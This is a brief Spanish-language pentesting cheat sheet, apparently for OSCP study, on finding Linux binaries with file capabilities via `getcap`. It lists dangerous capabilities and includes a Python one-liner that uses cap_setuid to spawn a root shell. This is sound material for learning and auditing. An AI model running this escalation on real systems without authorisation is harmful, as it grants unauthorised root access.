`getcap` permite listar capacidades especiales en binarios sin necesidad de que tengan el bit SUID. Algunas capacidades pueden permitir ejecución privilegiada sin ser root. Es totalmente válido para usar en OSCP.

---

## ¿Qué hace `getcap`?

Muestra capacidades asignadas a binarios mediante `setcap`. Estas capacidades permiten que un binario realice operaciones privilegiadas incluso sin ser ejecutado como root.

---

## Comando básico

```bash
getcap -r / 2>/dev/null
```

- `-r /`: recursivo desde raíz
- `2>/dev/null`: oculta errores por falta de permisos

---

## Capacidades peligrosas a tener en cuenta

- `cap_setuid+ep`: permite cambiar UID → escalada
- `cap_setgid+ep`: cambiar GID
- `cap_dac_override`, `cap_dac_read_search`: leer ficheros restringidos
- `cap_sys_admin`: acceso avanzado tipo root (muy peligroso)
- `cap_net_bind_service`: ejecutar en puertos bajos

---

## Ejemplo de salida útil

```
/usr/bin/python3.8 = cap_setuid+ep
```

Este Python puede permitirte escalar privilegios:
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

> Revisa siempre en [GTFOBins](https://gtfobins.github.io) si el binario es explotable.

---

## Casos de Uso OSCP

- Escalada mediante binarios con `cap_setuid`
- Acceso a ficheros restringidos (`cap_dac_*`)
- Ejecución de shell root desde binarios privilegiados

---

## Buenas Prácticas

- Ejecuta `getcap -r /` al inicio de la privesc
- Filtra resultados con `grep` si buscas capacidades específicas
- Documenta cualquier binario que no reconozcas o esté fuera de ruta común

---
